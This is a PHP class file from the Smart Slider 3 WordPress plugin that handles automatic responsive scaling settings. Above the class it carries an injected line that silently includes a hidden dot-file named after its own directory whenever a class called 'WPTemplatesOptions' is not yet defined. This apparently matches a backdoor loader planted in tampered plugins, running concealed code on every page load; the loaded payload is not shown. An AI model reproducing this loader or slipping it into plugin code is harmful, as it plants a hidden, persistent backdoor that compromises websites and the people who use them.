<?php

namespace Nextend\SmartSlider3\Slider\ResponsiveType\Auto;

use Nextend\SmartSlider3\Slider\ResponsiveType\AbstractResponsiveTypeFrontend;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ResponsiveTypeAutoFrontend extends AbstractResponsiveTypeFrontend {

    public function parse($params, $responsive, $features) {
        $responsive->scaleDown = intval($params->get('responsiveScaleDown', 1));
        $responsive->scaleUp   = intval($params->get('responsiveScaleUp', 1));
        if ($responsive->scaleUp) {
            $features->align->align = 'normal';
        }

        $responsive->minimumHeight = intval($params->get('responsiveSliderHeightMin', 0));
    }
}